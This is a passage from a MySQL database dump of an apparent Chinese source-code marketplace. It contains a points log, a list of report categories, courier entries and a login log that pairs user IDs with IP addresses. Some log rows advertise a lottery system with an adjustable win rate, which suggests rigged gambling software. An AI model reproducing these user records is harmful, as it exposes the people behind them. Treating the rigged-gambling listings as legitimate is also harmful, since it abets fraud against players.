(1042, 965, '注册会员赠送积分', 10, '2019-06-14 14:09:41', '1.194.64.111'),
(1043, 965, '每日签到', 10, '2019-06-14 14:14:02', '1.194.64.111'),
(1044, 966, '注册会员赠送积分', 10, '2019-06-15 03:07:21', '180.123.223.218'),
(1045, 967, '注册会员赠送积分', 10, '2019-06-16 23:36:45', '106.58.231.149'),
(1046, 965, '刷新商品[可看演示：可控制系统彩+日工资+契约分红+可接真人+上下级充值功能+可调胜率]，消耗积分', -10, '2019-06-17 10:21:33', '1.194.64.164'),
(1047, 965, '刷新商品[源码修复，出售搭建，一条龙建站，APP封装]，消耗积分', -10, '2019-06-17 10:21:33', '1.194.64.164'),
(1048, 965, '每日签到', 10, '2019-06-17 10:21:38', '1.194.64.164'),
(1049, 968, '注册会员赠送积分', 10, '2019-06-17 11:15:20', '42.236.179.84'),
(1050, 965, '刷新商品[可看演示：可控制系统彩+日工资+契约分红+可接真人+上下级充值功能+可调胜率]，消耗积分', -10, '2019-06-18 10:20:25', '1.194.64.164'),
(1051, 965, '每日签到', 6, '2019-06-18 19:01:49', '1.194.64.164'),
(1052, 965, '每日签到', 7, '2019-06-19 10:34:27', '1.194.70.62'),
(1053, 965, '刷新商品[源码修复，出售搭建，一条龙建站，APP封装]，消耗积分', -10, '2019-06-19 10:34:45', '1.194.70.62'),
(1054, 969, '注册会员赠送积分', 10, '2019-06-19 16:42:39', '219.157.183.249'),
(1055, 970, '注册会员赠送积分', 10, '2019-06-19 16:46:14', '219.157.183.249'),
(1056, 971, '注册会员赠送积分', 10, '2019-06-21 02:28:07', '111.174.81.55'),
(1057, 972, '注册会员赠送积分', 10, '2019-06-21 04:20:06', '58.243.254.3'),
(1058, 15, '每日签到', 10, '2019-06-21 05:11:13', '58.46.62.8'),
(1059, 973, '注册会员赠送积分', 10, '2019-06-21 09:43:08', '1.194.69.228'),
(1060, 965, '每日签到', 10, '2019-06-21 09:43:49', '1.194.69.228'),
(1061, 974, '注册会员赠送积分', 10, '2019-06-21 16:09:12', '119.130.215.237');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_jubao`
--

CREATE TABLE IF NOT EXISTS `yjcode_jubao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `jbqq` char(50) DEFAULT NULL,
  `jbid` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `tyid` int(10) DEFAULT NULL,
  `txt` text,
  `zt` int(10) DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_jubaotype`
--

CREATE TABLE IF NOT EXISTS `yjcode_jubaotype` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `tit` char(50) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=11 ;

--
-- 转存表中的数据 `yjcode_jubaotype`
--

INSERT INTO `yjcode_jubaotype` (`id`, `bh`, `sj`, `tit`, `xh`, `admin`, `zt`) VALUES
(1, '0806111001528210391', '2018-06-05 22:53:35', '重复铺货（同一卖家在平台一个店铺或多个店铺发布重复商品）', 1, 1, 0),
(2, '0149861001528210428', '2018-06-05 22:53:55', '出售禁品（出售平台或者法律法规中禁止的商品）', 2, 1, 0),
(3, '0962361001528210442', '2018-06-05 22:54:04', '描述不符（描述介绍和实际商品相差甚远，需在补充信息中填写具体不符细节）', 3, 1, 0),
(4, '0696736001528210466', '2018-06-05 22:54:28', '放错类目（商品属性与发布商品所选择的属性或类目严重不符的商品）', 4, 1, 0),
(5, '0868611001528210474', '2018-06-05 22:54:37', '危险交易（不支持平台在线安全交易，以种种理由要买家线下直接付款）', 5, 1, 0),
(6, '0337362001528210484', '2018-06-05 22:54:45', '商品虚假（发假货，完全不是交易所对应的商品）', 6, 1, 0),
(7, '0649861001528210491', '2018-06-05 22:54:53', '不予发货（拍下商品后，长时间不发货，且拒绝退款申请）', 7, 1, 0),
(8, '0056111001528210500', '2018-06-05 22:55:02', '商品侵权（所售商品侵犯了贵方权利，对贵方造成一定的影响或者损失）', 8, 1, 0),
(9, '0790486001528210509', '2018-06-05 22:55:11', '恶意广告（所发信息是明显的广告，不是真正意义上的商品销售）', 9, 1, 0),
(10, '0477985001528210517', '2018-06-05 22:55:19', ' 其他问题（请在下方补充信息中填写具体的举报内容）', 10, 1, 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_kc`
--

CREATE TABLE IF NOT EXISTS `yjcode_kc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `userid1` int(10) DEFAULT NULL,
  `ka` text,
  `mi` text,
  `ifok` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=3 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_kuaidi`
--

CREATE TABLE IF NOT EXISTS `yjcode_kuaidi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `tit` varchar(200) DEFAULT NULL,
  `kdweb` varchar(200) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `kdbh` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `yjcode_kuaidi`
--

INSERT INTO `yjcode_kuaidi` (`id`, `bh`, `tit`, `kdweb`, `xh`, `sj`, `zt`, `kdbh`) VALUES
(1, '1488458091', '顺丰速运', 'http://www.sf-express.com/cn/sc/', 1, '2017-03-02 20:35:00', 0, NULL),
(2, '1488458110', '申通快递', 'http://www.sto.cn/', 2, '2017-03-02 20:35:19', 0, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_loginlog`
--

CREATE TABLE IF NOT EXISTS `yjcode_loginlog` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `admin` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=1831 ;

--
-- 转存表中的数据 `yjcode_loginlog`
--

INSERT INTO `yjcode_loginlog` (`id`, `admin`, `userid`, `sj`, `uip`) VALUES
(10, 1, 14, '2017-03-02 19:51:26', '113.220.166.102'),
(11, 1, 14, '2017-03-03 11:56:41', '223.157.131.226'),
(12, 1, 15, '2017-03-03 20:46:51', '223.157.131.226'),
(13, 1, 16, '2017-03-03 21:36:51', '58.16.197.93'),
(14, 1, 16, '2017-03-03 23:21:54', '58.16.197.93'),
(15, 1, 14, '2017-03-04 03:15:55', '223.157.131.226'),
(16, 1, 16, '2017-03-04 10:30:34', '58.16.197.93'),
(17, 1, 15, '2017-03-04 14:22:20', '223.157.131.226'),
(18, 1, 17, '2017-03-05 10:53:25', '183.240.19.229'),
(19, 1, 16, '2017-03-05 15:32:49', '58.16.197.56'),
(20, 1, 15, '2017-03-06 12:55:06', '113.220.164.26'),
(21, 1, 18, '2017-03-07 19:58:12', '113.220.164.26'),
(22, 1, 15, '2017-03-07 19:58:36', '113.220.164.26'),
(23, 1, 19, '2017-03-08 20:20:38', '59.40.93.15'),
(24, 1, 20, '2017-03-09 12:36:02', '101.206.24.222'),
(25, 1, 21, '2017-03-09 15:55:05', '59.42.138.121'),
(26, 1, 22, '2017-03-09 17:22:39', '60.222.97.199'),
(27, 1, 23, '2017-03-09 19:38:25', '101.226.61.142'),
(28, 1, 24, '2017-03-11 15:16:34', '113.67.159.141'),
(29, 1, 25, '2017-03-13 21:34:39', '119.250.129.170'),
(30, 1, 26, '2017-03-15 17:51:16', '120.239.192.245'),
(31, 1, 27, '2017-03-17 16:02:44', '183.240.22.84'),
(32, 1, 28, '2017-03-17 19:04:10', '110.82.68.66'),
(33, 1, 29, '2017-03-18 00:13:10', '49.84.201.131'),
(34, 1, 30, '2017-03-25 22:27:01', '111.73.175.22'),
(35, 1, 31, '2017-03-28 00:21:14', '120.85.67.108'),
(36, 1, 14, '2017-03-29 18:42:18', '222.242.68.98'),
(37, 1, 32, '2017-03-29 22:02:14', '43.250.200.188'),
(38, 1, 33, '2017-03-31 10:30:40', '124.207.28.124'),
(39, 1, 34, '2017-03-31 16:31:28', '36.149.218.194'),
(40, 1, 35, '2017-04-03 20:19:59', '117.91.162.103'),
(41, 2, 1, '2017-04-04 14:02:15', '175.2.78.9'),
(42, 2, 1, '2017-04-04 14:31:28', '175.2.78.9'),
(43, 2, 5, '2017-04-04 16:32:22', '175.2.78.9'),
(44, 2, 5, '2017-04-04 16:53:05', '175.2.78.9'),
(45, 2, 5, '2017-04-04 21:56:12', '175.2.78.9'),
(46, 2, 5, '2017-04-04 21:56:47', '175.2.78.9'),
(47, 2, 1, '2017-04-04 22:04:51', '116.29.108.134'),
(48, 2, 1, '2017-04-04 22:17:33', '220.202.152.56'),
(49, 2, 1, '2017-04-04 22:41:30', '183.0.224.195'),
(50, 1, 36, '2017-04-05 00:11:50', '175.1.72.88'),
(51, 1, 36, '2017-04-05 00:19:23', '175.1.72.88'),
(52, 2, 5, '2017-04-05 01:28:15', '175.2.78.9'),
(53, 2, 1, '2017-04-05 02:04:38', '183.222.132.33'),
(54, 2, 1, '2017-04-05 11:29:22', '175.2.78.9'),
(55, 2, 1, '2017-04-05 15:11:07', '123.183.3.63'),
(56, 2, 1, '2017-04-05 17:50:00', '175.2.78.9'),
(57, 2, 1, '2017-04-05 18:45:13', '182.47.24.103'),
(58, 1, 37, '2017-04-05 19:34:31', '112.116.113.220'),
(59, 2, 1, '2017-04-05 22:47:23', '125.123.237.79'),
(60, 2, 1, '2017-04-06 10:37:15', '218.86.153.53'),
(61, 2, 1, '2017-04-06 19:29:53', '175.2.76.237'),
(62, 2, 1, '2017-04-06 23:36:08', '110.189.241.190'),
(63, 2, 1, '2017-04-07 13:10:46', '218.86.154.133'),
(64, 1, 38, '2017-04-07 13:13:27', '218.86.154.133'),
(65, 2, 1, '2017-04-07 13:21:18', '175.2.76.237'),
(66, 2, 5, '2017-04-07 13:38:45', '175.2.76.237'),
(67, 2, 1, '2017-04-07 16:40:54', '182.240.100.239'),
(68, 2, 1, '2017-04-07 19:28:48', '125.94.82.72'),
(69, 1, 39, '2017-04-07 20:21:12', '183.222.131.38'),
(70, 2, 1, '2017-04-08 11:18:03', '113.89.31.138'),
(71, 1, 40, '2017-04-08 12:36:34', '223.104.90.74'),
(72, 2, 1, '2017-04-08 13:59:00', '113.120.102.129'),
(73, 2, 5, '2017-04-08 16:23:51', '223.157.114.238'),
(74, 2, 1, '2017-04-08 18:24:34', '113.120.102.129'),
(75, 2, 1, '2017-04-08 20:16:25', '120.192.66.163'),
(76, 1, 40, '2017-04-08 20:20:38', '120.192.66.163'),
(77, 2, 1, '2017-04-08 23:00:54', '36.4.43.245'),
(78, 2, 1, '2017-04-08 23:52:27', '27.38.37.92'),
(79, 1, 38, '2017-04-09 07:07:12', '117.135.212.30'),
(80, 2, 1, '2017-04-09 07:07:41', '117.135.212.30'),
(81, 1, 41, '2017-04-09 11:36:10', '113.88.82.82'),
(82, 2, 1, '2017-04-09 11:43:17', '113.88.82.82'),
(83, 2, 1, '2017-04-09 11:48:39', '113.220.167.57'),
(84, 2, 1, '2017-04-09 13:10:14', '113.88.82.82'),
(85, 2, 1, '2017-04-09 14:14:11', '113.88.82.82'),
(86, 1, 41, '2017-04-09 14:25:43', '113.88.82.82'),
(87, 2, 1, '2017-04-09 14:43:02', '121.207.33.111'),
(88, 2, 5, '2017-05-01 03:13:23', '124.231.162.4'),
(89, 2, 1, '2017-05-01 21:35:12', '124.231.162.4'),
(90, 2, 5, '2017-05-01 21:37:22', '124.231.162.4'),
(91, 1, 15, '2017-05-02 20:48:09', '223.157.189.70'),
(92, 2, 1, '2017-05-02 23:10:00', '183.225.46.132'),
(93, 2, 1, '2017-05-03 00:31:09', '183.225.46.132'),
(94, 2, 1, '2017-05-03 21:44:07', '183.222.135.102'),
(95, 1, 39, '2017-05-03 21:47:31', '183.222.135.102'),
(96, 2, 5, '2017-05-03 22:20:56', '113.220.221.84'),
(97, 1, 42, '2017-05-03 23:03:52', '182.131.125.214'),
(98, 1, 43, '2017-05-04 00:53:20', '39.128.40.228'),
(99, 1, 44, '2017-05-04 09:23:32', '27.192.37.159'),
(100, 1, 45, '2017-05-04 09:25:56', '110.182.204.34'),
(101, 1, 45, '2017-05-04 09:29:40', '110.182.204.34'),
(102, 2, 1, '2017-05-04 17:27:51', '123.53.51.72'),
(103, 1, 39, '2017-05-04 18:00:10', '183.222.135.102'),
(104, 2, 1, '2017-05-04 18:06:37', '183.222.135.102'),
(105, 1, 15, '2017-05-04 18:15:52', '113.220.221.84'),
(106, 2, 1, '2017-05-04 23:52:04', '113.80.11.191'),
(107, 2, 1, '2017-05-05 01:01:17', '183.222.135.102'),
(108, 2, 1, '2017-05-05 03:01:15', '113.80.11.191'),
(109, 2, 1, '2017-05-05 10:22:43', '14.124.95.30'),
(110, 1, 39, '2017-05-05 14:04:42', '183.222.134.124'),
(111, 1, 46, '2017-05-05 17:53:20', '14.17.37.143'),
(112, 1, 39, '2017-05-06 14:10:52', '183.222.128.24'),
(113, 2, 1, '2017-05-06 20:24:28', '113.223.57.152'),
(114, 2, 1, '2017-05-06 21:37:43', '59.42.238.54'),
(115, 2, 1, '2017-05-06 22:31:17', '211.162.8.233'),
(116, 2, 1, '2017-05-07 13:28:25', '59.42.239.114'),
(117, 2, 1, '2017-05-07 13:30:19', '39.128.38.175'),
(118, 1, 47, '2017-05-07 14:36:19', '36.149.71.177'),
(119, 2, 1, '2017-05-07 22:51:51', '118.205.173.84'),
(120, 1, 48, '2017-05-07 22:53:47', '118.205.173.84'),
(121, 1, 49, '2017-05-08 07:32:07', '182.241.165.3'),
(122, 1, 50, '2017-05-08 10:40:08', '27.214.234.195'),
(123, 1, 51, '2017-05-08 20:20:45', '112.231.38.10'),
(124, 2, 1, '2017-05-08 21:07:18', '223.88.41.40'),
(125, 2, 1, '2017-05-08 22:23:25', '14.106.29.216'),
(128, 2, 5, '2017-05-09 12:01:09', '124.231.176.136'),
(129, 2, 1, '2017-05-09 16:04:20', '183.222.129.59'),
(130, 1, 39, '2017-05-09 16:06:04', '183.222.129.59'),
(131, 1, 39, '2017-05-10 00:43:08', '183.222.129.59'),
(132, 2, 1, '2017-05-10 00:59:06', '112.231.251.172'),
(133, 1, 53, '2017-05-10 08:33:20', '111.30.81.121'),
(134, 1, 14, '2017-05-10 11:24:45', '223.157.124.255'),
(135, 2, 1, '2017-05-10 11:34:13', '120.239.14.21'),
(136, 1, 14, '2017-05-10 18:04:05', '223.157.124.255'),
(137, 1, 14, '2017-05-10 18:46:21', '223.157.124.255'),
(138, 2, 5, '2017-05-10 19:20:24', '223.157.124.255'),
(139, 1, 14, '2017-05-10 21:31:00', '223.157.124.255'),
(140, 2, 5, '2017-05-10 21:31:57', '223.157.124.255'),
(141, 2, 5, '2017-05-10 23:25:37', '223.157.124.255'),
(142, 2, 5, '2017-05-11 11:51:05', '223.157.234.91'),
(144, 2, 5, '2017-05-11 20:39:51', '175.2.1.184'),
(145, 2, 1, '2017-05-11 21:17:24', '36.4.44.59'),
(146, 1, 55, '2017-05-11 21:29:54', '59.46.38.53'),
(147, 2, 1, '2017-05-12 08:32:37', '59.46.38.53'),
(148, 1, 55, '2017-05-12 08:44:55', '59.46.38.53'),
(149, 1, 56, '2017-05-12 10:07:20', '60.171.240.222'),
(150, 2, 5, '2017-05-12 18:55:22', '58.211.2.126'),
(151, 2, 5, '2017-05-12 19:01:43', '58.211.2.60'),
(152, 1, 57, '2017-05-12 22:00:30', '58.211.2.36'),
(153, 1, 58, '2017-05-13 09:45:19', '117.34.13.96'),
(154, 2, 1, '2017-05-13 12:55:01', '58.211.2.18'),
(155, 1, 56, '2017-05-13 13:02:23', '58.211.2.18'),
(156, 2, 1, '2017-05-13 20:52:46', '117.34.13.30'),
(157, 1, 59, '2017-05-13 20:56:17', '117.34.13.30'),
(158, 1, 14, '2017-05-13 20:59:57', '101.227.207.48'),
(159, 2, 5, '2017-05-13 21:17:07', '101.227.207.48'),
(160, 1, 60, '2017-05-15 10:14:43', '117.34.13.12'),
(161, 1, 15, '2017-05-15 10:21:46', '101.227.207.48'),
(162, 1, 15, '2017-05-15 10:22:34', '101.227.207.48'),
(163, 1, 61, '2017-05-15 10:23:20', '101.227.207.48'),
(164, 1, 62, '2017-05-16 00:36:26', '42.236.93.26'),
(165, 2, 1, '2017-05-16 13:54:48', '58.211.2.6'),
(166, 2, 1, '2017-05-16 13:58:44', '116.31.126.211'),
(167, 2, 1, '2017-05-16 14:00:35', '101.227.207.36'),
(168, 1, 63, '2017-05-16 17:10:16', '58.211.2.6'),
(169, 2, 1, '2017-05-17 11:19:17', '42.236.93.71'),
(170, 2, 1, '2017-05-18 00:13:15', '122.190.2.66'),
(171, 2, 5, '2017-05-18 14:54:15', '101.227.207.42'),
(172, 2, 5, '2017-05-18 15:45:36', '58.211.2.84'),
(173, 2, 1, '2017-05-18 20:03:05', '42.236.93.81'),
(174, 2, 1, '2017-05-18 21:11:40', '58.211.2.36'),
(175, 1, 63, '2017-05-18 21:25:26', '58.211.2.36'),
(176, 2, 5, '2017-05-22 21:10:16', '59.51.81.145'),
(177, 1, 64, '2017-05-22 23:25:16', '117.34.13.60'),
(178, 2, 5, '2017-05-23 00:01:34', '59.51.81.145'),
(179, 1, 65, '2017-05-23 00:32:35', '116.31.126.101'),
(180, 2, 5, '2017-05-24 11:20:58', '59.51.81.178'),
(181, 1, 14, '2017-05-24 12:10:06', '59.51.81.188'),
(182, 2, 1, '2017-05-24 23:44:32', '115.231.186.72'),
(183, 2, 1, '2017-05-27 08:25:28', '115.231.186.36'),
(184, 2, 5, '2017-05-27 11:04:05', '122.190.2.72'),
(185, 1, 66, '2017-05-27 13:41:35', '115.231.186.36'),
(186, 2, 5, '2017-05-28 12:53:01', '59.51.81.188'),
(187, 2, 5, '2017-05-28 08:48:16', '175.2.83.40'),
(188, 2, 5, '2017-05-28 09:14:37', '175.2.83.40'),
(189, 2, 5, '2017-06-01 12:46:37', '127.0.0.1'),
(190, 2, 5, '2017-06-01 07:26:04', '175.2.82.91'),
(191, 1, 15, '2017-06-01 19:13:07', '59.51.81.188'),
(192, 2, 1, '2017-06-02 10:12:15', '115.231.186.42'),
(193, 2, 1, '2017-06-02 12:47:40', '116.31.126.108'),
(194, 2, 1, '2017-06-02 17:38:21', '122.190.2.54'),
(195, 2, 1, '2017-06-02 19:36:16', '116.31.126.107'),
(196, 2, 1, '2017-06-04 14:47:27', '58.211.2.120'),
(197, 2, 1, '2017-06-06 19:41:53', '117.34.13.30'),
(198, 2, 1, '2017-06-06 21:47:38', '115.231.186.78'),
(199, 2, 1, '2017-06-07 12:21:33', '117.34.13.78'),
(200, 2, 5, '2017-06-09 20:52:56', '59.51.81.188'),
(201, 1, 58, '2017-06-12 21:48:11', '117.34.13.48'),
(202, 1, 58, '2017-06-12 23:39:28', '117.34.13.48'),
(203, 1, 67, '2017-06-13 12:04:50', '59.51.81.178'),
(204, 2, 1, '2017-06-13 12:05:46', '59.51.81.178'),
(205, 2, 1, '2017-06-17 11:20:37', '116.31.126.103'),
(206, 2, 1, '2017-06-17 13:46:10', '116.31.126.108'),
(207, 1, 39, '2017-06-18 16:25:18', '122.190.2.6'),
(208, 2, 1, '2017-06-18 17:53:53', '59.51.81.183'),
(209, 2, 1, '2017-06-18 20:50:17', '101.71.55.105'),
(210, 1, 39, '2017-06-19 01:31:23', '122.190.2.6'),
(211, 2, 1, '2017-06-19 05:28:51', '101.71.55.105'),
(212, 1, 39, '2017-06-19 20:19:30', '122.190.2.6'),
(213, 1, 39, '2017-06-19 20:31:07', '122.190.2.6'),
(214, 2, 5, '2017-06-21 10:03:07', '42.236.93.76'),
(215, 1, 68, '2017-06-21 11:41:27', '115.231.186.72'),
(216, 2, 1, '2017-06-22 17:40:24', '58.211.2.60'),
(217, 1, 69, '2017-06-23 05:26:17', '116.31.126.211'),
(218, 2, 5, '2017-06-24 14:59:29', '59.51.81.183'),
(219, 2, 1, '2017-06-24 15:39:22', '42.236.93.56'),
(220, 1, 70, '2017-06-24 23:18:28', '116.31.126.105'),
(221, 2, 1, '2017-06-24 23:26:16', '116.31.126.101'),
(222, 2, 5, '2017-06-25 10:56:55', '59.51.81.183'),
(223, 2, 5, '2017-06-27 11:27:55', '59.51.81.178'),
(224, 2, 5, '2017-06-27 14:01:11', '59.51.81.178'),
(225, 2, 5, '2017-06-27 17:15:02', '59.51.81.178'),
(226, 2, 5, '2017-06-28 19:13:08', '59.51.81.136'),
(227, 2, 5, '2017-06-28 19:41:39', '59.51.81.178'),
(228, 2, 5, '2017-06-28 20:23:18', '59.51.81.136'),
(229, 2, 5, '2017-06-29 22:35:59', '223.157.220.85'),
(230, 2, 5, '2017-06-30 00:19:48', '223.157.220.85'),
(231, 1, 71, '2017-06-30 01:23:57', '223.157.220.85'),
(233, 1, 69, '2017-07-01 02:46:38', '125.73.204.37'),
(235, 2, 1, '2017-07-04 10:26:39', '36.4.47.84'),
(238, 2, 5, '2017-07-05 14:08:41', '175.2.1.74'),
(239, 2, 1, '2017-07-06 22:16:00', '113.220.229.187'),
(240, 2, 5, '2017-07-06 22:25:17', '113.220.229.187'),
(242, 2, 5, '2017-07-14 19:16:18', '175.2.7.95'),
(243, 2, 1, '2017-07-16 22:36:37', '220.115.183.143'),
(244, 2, 1, '2017-07-17 15:45:20', '117.64.135.188'),
(245, 2, 5, '2017-07-17 16:54:38', '58.46.1.66'),
(246, 2, 1, '2017-07-17 18:36:37', '121.205.45.4'),
(247, 2, 5, '2017-07-17 18:38:13', '121.205.45.4'),
(250, 2, 5, '2017-07-17 23:43:30', '58.46.1.66'),
(252, 2, 1, '2017-07-18 20:16:52', '220.115.183.143'),
(253, 2, 1, '2017-07-19 16:00:20', '220.115.183.143'),
(255, 2, 5, '2017-07-19 20:51:14', '124.231.162.111'),
(256, 2, 5, '2017-07-19 22:54:26', '124.231.162.111'),
(257, 2, 1, '2017-07-20 11:15:19', '113.56.206.8'),
(258, 2, 5, '2017-07-20 14:16:50', '175.2.155.102'),
(259, 2, 1, '2017-07-20 20:41:36', '113.104.244.118'),
(260, 2, 1, '2017-07-22 11:28:09', '58.50.39.45'),
(262, 2, 5, '2017-07-22 23:07:19', '27.26.188.126'),
(264, 2, 1, '2017-07-23 01:37:33', '183.21.191.123'),
(265, 2, 5, '2017-07-23 01:43:22', '183.21.191.123'),
(267, 2, 5, '2017-07-23 17:56:31', '183.21.191.123'),
(269, 2, 5, '2017-07-25 04:12:15', '183.21.191.222'),
(270, 2, 5, '2017-07-26 23:16:21', '183.21.190.221'),
(271, 2, 1, '2017-07-27 14:52:48', '119.97.252.212'),
(272, 2, 1, '2017-07-28 20:53:15', '27.189.51.67'),
(273, 2, 5, '2017-07-29 14:51:26', '175.2.75.19'),
(274, 2, 1, '2017-07-29 14:52:56', '116.8.33.243'),
(275, 2, 5, '2017-07-29 14:54:12', '116.8.33.243'),
(277, 2, 5, '2017-07-31 18:44:00', '113.220.167.77'),
(278, 2, 5, '2017-07-31 22:04:50', '113.220.167.77'),
(280, 2, 1, '2017-08-02 18:31:04', '110.183.24.190'),
(281, 2, 5, '2017-08-02 19:35:08', '110.183.24.190'),
(283, 2, 5, '2017-08-02 19:49:45', '124.231.174.167'),
(284, 2, 5, '2017-08-02 20:14:33', '124.231.174.167'),
(286, 2, 5, '2017-08-04 11:36:21', '175.2.48.34'),
(288, 2, 1, '2017-08-04 17:17:26', '110.183.24.190'),
(289, 2, 5, '2017-08-04 17:23:34', '223.157.155.243'),
(290, 2, 1, '2017-08-04 18:11:01', '223.157.155.243'),
(291, 2, 5, '2017-08-05 13:30:40', '223.157.155.243'),
(292, 2, 5, '2017-08-07 21:47:35', '113.220.224.32'),
(293, 2, 5, '2017-08-08 00:54:19', '113.220.224.32'),
(294, 2, 1, '2017-08-08 19:30:19', '101.81.38.153'),
(295, 2, 1, '2017-08-08 19:50:35', '60.175.244.22'),
(296, 2, 1, '2017-08-08 21:23:44', '101.81.38.153'),
(298, 2, 1, '2017-08-09 00:04:16', '115.175.67.238'),
(299, 2, 1, '2017-08-10 06:16:29', '60.207.7.16'),
(300, 2, 5, '2017-08-11 12:41:04', '124.231.174.4'),
(301, 2, 1, '2017-08-12 11:04:17', '123.183.0.161'),
(303, 2, 1, '2017-08-13 01:23:27', '110.228.9.170'),
(304, 2, 1, '2017-08-13 10:42:19', '171.91.80.86'),
(307, 2, 1, '2017-08-13 17:19:13', '39.190.234.1'),
(308, 2, 5, '2017-08-14 00:44:22', '175.2.122.10'),
(309, 2, 5, '2017-08-14 01:07:02', '175.2.122.10'),
(310, 2, 5, '2017-08-14 01:09:03', '175.2.122.10'),
(311, 2, 5, '2017-08-14 01:18:12', '175.2.122.10'),
(312, 2, 1, '2017-08-14 09:13:31', '125.112.219.61'),
(313, 2, 5, '2017-08-14 12:22:38', '223.157.119.167'),
(314, 2, 1, '2017-08-14 17:38:33', '59.40.50.119'),
(315, 2, 1, '2017-08-15 16:11:47', '101.81.38.153'),
(316, 2, 5, '2017-08-15 17:07:29', '223.157.119.167'),
(318, 2, 5, '2017-08-16 00:37:43', '223.157.119.167'),
(319, 2, 5, '2017-08-16 09:41:48', '223.157.119.167'),
(320, 2, 1, '2017-08-16 09:51:36', '113.75.18.26'),
(321, 2, 1, '2017-08-16 12:35:21', '123.161.52.46'),
(323, 2, 1, '2017-08-16 13:51:23', '61.141.152.48'),
(324, 2, 5, '2017-08-16 13:52:47', '223.157.126.198'),
(325, 2, 5, '2017-08-16 14:16:45', '113.56.206.31'),
(326, 2, 5, '2017-08-16 14:21:18', '61.141.152.48'),
(327, 2, 5, '2017-08-16 17:10:16', '223.157.126.198'),
(328, 2, 5, '2017-08-16 20:45:39', '117.29.154.197'),
(329, 2, 1, '2017-08-17 01:06:57', '61.141.153.236'),
(330, 2, 1, '2017-08-17 15:04:57', '113.94.54.154'),
(331, 2, 1, '2017-08-18 07:16:16', '113.94.55.151'),
(332, 1, 92, '2017-08-18 07:17:37', '113.94.55.151'),
(333, 1, 93, '2017-08-19 08:29:39', '182.242.169.227'),
(334, 2, 5, '2017-08-19 10:09:15', '113.56.206.127'),
(335, 2, 5, '2017-08-19 18:05:27', '124.231.173.27'),
(336, 2, 1, '2017-08-19 19:24:55', '60.175.244.22'),
(337, 1, 94, '2017-08-19 23:47:03', '125.78.90.207'),
(338, 2, 1, '2017-08-21 00:33:07', '101.232.174.243'),
(339, 2, 1, '2017-08-21 17:44:03', '220.112.16.156'),
(340, 2, 1, '2017-08-22 17:02:08', '113.75.16.194'),
(341, 2, 5, '2017-08-22 18:53:39', '175.2.124.14'),
(342, 2, 5, '2017-08-22 21:28:35', '115.120.207.47'),
(343, 2, 1, '2017-08-22 23:22:14', '36.149.235.195'),
(344, 2, 1, '2017-08-22 23:34:28', '120.229.103.164'),
(345, 2, 1, '2017-08-22 23:41:44', '120.229.103.164'),
(346, 2, 5, '2017-08-22 23:48:28', '120.229.103.164'),
(347, 2, 1, '2017-08-23 00:36:44', '175.2.124.14'),
(348, 2, 6, '2017-08-23 00:41:13', '175.2.124.14'),
(349, 2, 6, '2017-08-23 02:19:16', '175.2.124.14'),
(350, 1, 95, '2017-08-23 10:06:54', '120.229.103.164'),
(351, 2, 5, '2017-08-31 15:54:25', '223.157.152.215'),
(352, 1, 96, '2017-08-31 16:51:25', '171.92.217.8'),
(353, 1, 97, '2017-09-01 21:14:21', '111.198.38.182'),
(354, 2, 5, '2017-09-03 12:02:33', '223.157.237.109'),
(355, 1, 98, '2017-09-03 14:25:09', '39.90.33.216'),
(356, 1, 99, '2017-09-03 19:53:56', '113.248.157.83'),
(357, 1, 99, '2017-09-03 19:55:35', '113.248.157.83'),
(358, 2, 5, '2017-09-05 11:35:26', '222.41.112.170'),
(359, 2, 5, '2017-09-05 16:15:09', '27.20.17.52'),
(360, 1, 100, '2017-09-05 17:16:43', '221.222.68.12'),
(361, 1, 101, '2017-09-05 17:59:02', '113.68.130.143'),
(362, 1, 102, '2017-09-06 01:45:08', '125.116.208.181'),
(363, 1, 102, '2017-09-06 04:09:52', '125.116.208.181'),
(364, 2, 5, '2017-09-06 07:50:57', '222.41.112.170'),
(365, 1, 97, '2017-09-06 08:04:20', '61.184.34.51'),
(366, 1, 103, '2017-09-06 10:55:14', '223.96.220.207'),
(367, 2, 5, '2017-09-06 16:09:42', '222.41.112.170'),
(368, 1, 104, '2017-09-07 01:23:16', '223.96.222.136'),
(369, 1, 105, '2017-09-07 10:06:49', '223.96.222.114'),
(370, 1, 105, '2017-09-07 10:07:57', '223.96.222.114'),
